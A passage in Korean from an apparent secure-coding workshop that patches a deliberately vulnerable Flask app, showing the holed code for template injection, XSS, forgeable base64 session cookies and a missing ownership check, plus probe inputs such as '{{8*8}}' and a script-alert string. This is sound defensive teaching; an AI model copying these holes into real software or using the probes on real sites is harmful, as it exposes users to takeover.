페이지는 HTML 응답을 렌더링하기 위해 **[render_template_string](https://flask.palletsprojects.com/en/2.0.x/templating/)**  을 사용합니다. **render_template_string**은 문자열이 유효한 파이썬 코드를 포함하도록 수정된 경우 잠재적인 **Server-Side Template Injection (SSTI)** 을 트리거할 수 있는 문자열에서 직접 템플릿을 렌더링합니다.

잠재적인 SSTI 공격을 방지하기 위해 템플릿 수정을 허용하지 않기 때문에 더 안전한 **render_template**으로 이를 대체합니다. 이 문제를 해결하기 위해 **a1.py** 코드를 다음과 같이 교체합니다.

```python
from flask import (
    Blueprint,
    request,
    render_template
)

bp = Blueprint(
    "a1", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A1")
def a1():
    name = request.args.get("name", "")
    return render_template("a1.html", name=name)
```

**a1.py**에 변경 사항을 저장하고 다음 취약점으로 이동합니다.


# 보안 토큰 생성

**flask-app** 프로젝트에서 **utils.py**를 열면:

```python
import json
import base64
from datetime import datetime

def generate_session(username):
    ### Generate sessionId
    session_obj = {"username": username, "timestamp": datetime.now().isoformat()}
    session_id = base64.b64encode(json.dumps(session_obj).encode("utf-8"))
    return session_id

def parse_session(session_obj):
    ### Parse sessionId
    session_obj = json.loads(base64.b64decode(session_obj).decode("utf-8"))
    return session_obj
```

**sessionId**를 생성하는 데 사용되는 **generate_session** 함수가 있습니다. **sessionId**는 **username** 및 **timestamp** 필드를 포함하는 **base64** 인코딩된 JSON 객체이므로 매우 예측 가능한 방식으로 생성됩니다. **[Salt](https://en.wikipedia.org/wiki/Salt_(cryptography))**  를 추가하기만 하면 깨진 인증을 방지할 수 있습니다. 빠른 수정을 위해 **[secrets](https://docs.python.org/3/library/secrets.html#module-secrets)**  를 사용하여 세션 개체에 임의의 값을 지정해 보겠습니다. **[secrets](https://docs.python.org/3/library/secrets.html#module-secrets)**  모듈은 암호 및 보안 토큰 관리에 적합한 강력한 암호학적 난수를 제공합니다.

```python
import secrets
import json
import base64
from datetime import datetime

def generate_session(username):
    ### Generate sessionID
    session_obj = {"username": username, "timestamp": datetime.now().isoformat(), "salt": secrets.token_urlsafe()}
    session_id = base64.b64encode(json.dumps(session_obj).encode("utf-8"))
    return session_id

def parse_session(session_obj):
    ### Parse sessionId
    session_obj = json.loads(base64.b64decode(session_obj).decode("utf-8"))
    return session_obj
```

다른 프로그래밍 언어의 경우 이 **[Guide](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation)**  에서 사용하는 **Secure Random Number Generator**가 사용할 수 있는 항목을 확인할 수 있습니다.

이것은 **sessionId**를 예측하기 어렵게 만들지만. 인증된 사용자(발급된 토큰이 메모리 또는 데이터베이스에 저장됨)의 모든 요청에 대해 **Salt**의 유효성을 검사해야 하므로 **Broken Authentication** 문제가 아직 완전히 수정되지 않습니다. 직접 구현하거나 **[Flask-Login](https://flask-login.readthedocs.io/en/latest/)**  을 사용할 수 있습니다. **[Amazon Cognito](https://aws.amazon.com/cognito/)**  와 같은 ID 서비스를 사용할 수도 있습니다.

**token_urlsafe()** 함수는 임의의 URL 안전 텍스트 문자열을 생성합니다. 기본적으로 **32바이트** 값의 임의 문자열을 생성합니다. 2015년 현재 32바이트면 현재의 연산 능력으로부터 보호하기에 충분하다고 믿어집니다. 문자열의 크기를 직접 지정하거나 기본값으로 둘 수 있습니다(시간이 지남에 따라 변경됨).

# 액세스 제어 수정

**flask-app** 프로젝트에서 **pages/a5.py**를 열면:

```python
from flask import (
    Blueprint,
    request,
    redirect,
    make_response,
    render_template
)

from models import (
    get_user,
    get_user_by_password
)

from utils import (
    generate_session,
    parse_session
)

bp = Blueprint(
    "a5", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A5")
def a5():
    return render_template("a5.html")

@bp.route("/A5/auth", methods=['POST'])
def a5_auth():
    username = request.form.get("username")
    password = request.form.get("password")
    user = get_user_by_password(username, password)
    if not user:
        return render_template("error.html", message="Invalid Credentials")
    
    # Generate SessionID
    session_id = generate_session(username)
    response = make_response(redirect("/owasp/A5/profile/{}".format(username)))
    response.set_cookie("sessionId", session_id)
    
    return response

@bp.route("/A5/profile/<username>")
def a5_profile(username):
    if not request.cookies.get("sessionId"):
        return ("<h1>Not Authorized!</h1>")
    session = parse_session(request.cookies.get("sessionId"))
    user = get_user(username)
    if not user:
        return render_template("404.html")
    return render_template("profile.html", user=user)
```

**/A5/profile/\<username>** URL에 응답하는 함수는 **sessionId**에서 파생된 현재 사용자가 사용자와 동일한지 여부도 확인하지 않고 액세스하려고합니다. 개발자가 검사를 구현하는 것을 잊었거나 요구 사항에 대한 잘못된 의사 소통이 있었을 수 있습니다.

체크를 추가하면 빠르게 패치할 수 있습니다.

```python
from flask import (
    Blueprint,
    request,
    redirect,
    make_response,
    render_template
)

from models import (
    get_user,
    get_user_by_password
)

from utils import (
    generate_session,
    parse_session
)

bp = Blueprint(
    "a5", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A5")
def a5():
    return render_template("a5.html")

@bp.route("/A5/auth", methods=['POST'])
def a5_auth():
    username = request.form.get("username")
    password = request.form.get("password")
    user = get_user_by_password(username, password)
    if not user:
        return render_template("error.html", message="Invalid Credentials")
    
    # Generate SessionID
    session_id = generate_session(username)
    response = make_response(redirect("/owasp/A5/profile/{}".format(username)))
    response.set_cookie("sessionId", session_id)
    
    return response

@bp.route("/A5/profile/<username>")
def a5_profile(username):
    if not request.cookies.get("sessionId"):
        return ("<h1>Not Authorized!</h1>")
    session = parse_session(request.cookies.get("sessionId"))
    if session['username'] != username:
        return ("<h1>Not Authorized!</h1>")
    user = get_user(username)
    if not user:
        return render_template("404.html")
    return render_template("profile.html", user=user)
```

# 서버 세부 정보 숨기기

**Server** 헤더를 변경하여 플랫폼의 세부 정보를 난독화해 보겠습니다. 상당히 쉬운 수정입니다. **flask-app** 프로젝트에서 **app.py**의 내용을 바꾸기만 하면 됩니다.

```python
import os
from flask import Flask

from pages import (
    index,
    about,
    a1,
    a2,
    a3,
    a5,
    a6,
    a7,
    a9
)

import models
from flask_wtf.csrf import CSRFProtect

### Initialize App
app = Flask(__name__)
app.url_map.strict_slashes = False

### Enable CSRF
app.config['SECRET_KEY'] = os.urandom(32)
csrf = CSRFProtect()
csrf.init_app(app)


### Register blueprints
app.register_blueprint(index.bp)
app.register_blueprint(about.bp, url_prefix="/about")
app.register_blueprint(a1.bp, url_prefix="/owasp")
app.register_blueprint(a2.bp, url_prefix="/owasp")
app.register_blueprint(a3.bp, url_prefix="/owasp")
app.register_blueprint(a5.bp, url_prefix="/owasp")
app.register_blueprint(a6.bp, url_prefix="/owasp")
app.register_blueprint(a7.bp, url_prefix="/owasp")
app.register_blueprint(a9.bp, url_prefix="/owasp")

### Configure database
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///user.db"
models.db.init_app(app)
models.db.app = app
models.bootstrap(app)

### Add Security Headers
@app.after_request
def add_security_headers(r):
    r.headers['X-Frame-Options'] = 'SAMEORIGIN'
    r.headers['Server'] = 'SECRET'
    return r
```

DEBUG 모드도 끄겠습니다! **flask-app** 프로젝트에서 **Dockerfile**을 열면 문제를 볼 수 있습니다.

```bash
FROM public.ecr.aws/f9e7c7j6/python:3.8.3-wee-optimized-lto
COPY requirements.txt requirements.txt
RUN pip3 install -r requirements.txt
COPY . .
ENV FLASK_APP=app.py
ENV FLASK_ENV=development
CMD ["flask", "run", "--port=5000", "--host=0.0.0.0"]
```

**FLASK_ENV** 값을 **development에서 production**으로 설정하여 DEBUG 모드를 끄기만 하면 됩니다.

```bash
FROM public.ecr.aws/adelagon/python:3.8.3-wee-optimized-lto
COPY requirements.txt requirements.txt
RUN pip3 install -r requirements.txt
COPY . .
ENV FLASK_APP=app.py
ENV FLASK_ENV=production
CMD ["flask", "run", "--port=5000", "--host=0.0.0.0"]
```

# Escape HTML

**flask-app** 프로젝트에서 **pages/a7.py**를 열면 **render_template_string**이 또 다른 용도로 사용되는 것을 볼 수 있습니다.

```python
from flask import (
    Blueprint,
    request,
    render_template_string
)

bp = Blueprint(
    "a7", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A7")
def a7():
    name = request.args.get("name", "")
    with open("templates/a7.html") as f:
        template = f.read()
    content = template.replace("{{ name }}", name)
    
    return render_template_string(content)
```

SSTI 취약점을 수정한 것처럼 HTML을 자동 이스케이프하는 더 엄격한 **render_template**을 긴급 픽스로 사용할 수 있습니다.

```python
from flask import (
    Blueprint,
    request,
    render_template
)

bp = Blueprint(
    "a7", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A7")
def a7():
    name = request.args.get("name", "")
    return render_template("a7.html", name=name)
```

이를 방지하는 더 좋은 방법은 입력을 검증하는 것입니다. **[Bleach](https://github.com/mozilla/bleach)**  와 같이 이를 전문으로 하는 파이썬 라이브러리가 있습니다.

# 수정 사항 검증 및 Push

1.  이제 보안 수정 사항을 적용했으므로 AWS Cloud9의 터미널 창으로 이동하여 변경 사항을 게시하겠습니다.

```bash
cd ~/environment/flask-app
git commit -a -m"Fix Secure Code Review Findings"
git push
```

2.  그러면 릴리스 파이프라인이 자동으로 트리거됩니다. AWS CodePipeline으로 이동하여 **DAST** 단계를 통과할 때까지 진행 상황을 지켜보십시오.

![dast-pipeline](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/dast-pipeline.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  **SSTI** 취약점을 수정했는지 확인해보자. "A1: Injection Page"(**owasp/A1**)로 이동하여 HTML 양식에 **{{8*8}}**를 입력합니다. 더 이상 임의의 코드를 실행하지 않아야 합니다.

![ssti-fixed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/ssti-fixed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  "A5: Broken Access Control Page"(**owasp/A5**)로 이동하여 공격자의 자격 증명(**Username**: badguy **Password**: badguy)으로 로그인하는 경우. 로그인한 후 URL을 **owasp/A5/profile/badguy**에서 **owasp/A5/profile/john**으로 변경해 보세요. 이제 **Not Authorized** 오류가 표시됩니다.

![acl-fixed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/acl-fixed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  플랫폼 정보를 제대로 숨겼는지 확인해 봅시다. "A6: Security Misconfiguration Page"(**owasp/A6**)을 열고 HTML 양식에 숫자가 아닌 문자열을 입력합니다. 디버그 세부 정보가 더 이상 표시되지 않아야 합니다.

![debug-fixed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/debug-fixed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

6.  이제 HTTP 응답 헤더의 서버 헤더에 웹 서버의 전체 세부 정보 대신 **SECRET**이 표시되어야 합니다. 또한 **DAST** 결과를 수정하기 위해 이전에 추가한 새로운 **X-Frame-Options** 헤더가 표시되어야 합니다.

![header-fixed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/header-fixed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

7.  마지막으로 스크립트를 더 이상 주입할 수 없는지 확인해보자. "A7: Cross-Site Scripting (XSS) Page" **(owasp/A7)** 를 열고 HTML 양식에 `<script>alert("LOL!")</script>`를 붙여넣습니다. 브라우저에서 실행되는 대신 스크립트를 무해한 문자열로 렌더링해야 합니다.

![xss-fixed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/xss-fixed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# 9. 삭제

자신의(또는 조직의) AWS 계정을 사용하여 이 워크숍을 진행한 경우 다음과 같이 세 단계로 배포한 모든 것을 간단하게 정리할 수 있습니다.:

1.  AWS 콘솔에 **ECR**을 입력하고 ECR 콘솔을 엽니다. **flask-app** 개인 저장소를 선택하고 **Delete**를 클릭합니다. 삭제 확인을 입력하고 다음 단계로 진행합니다.

![ecr-delete](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/ecr-delete.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  AWS Cloud9으로 돌아가 아래 명령을 입력하여 이 워크숍에서 프로비저닝한 모든 것을 제거합니다.:

```bash
1
2
cd ~/environment/pipeline
cdk destroy
```

3.  **cdk destroy**가 작업을 완료하면 선택적으로 AWS Cloud9 환경을 삭제할 수 있습니다. Cloud9 콘솔로 이동하여 Cloud9 환경을 선택하고 **삭제**를 클릭합니다.

![cloud9-delete](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-delete.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)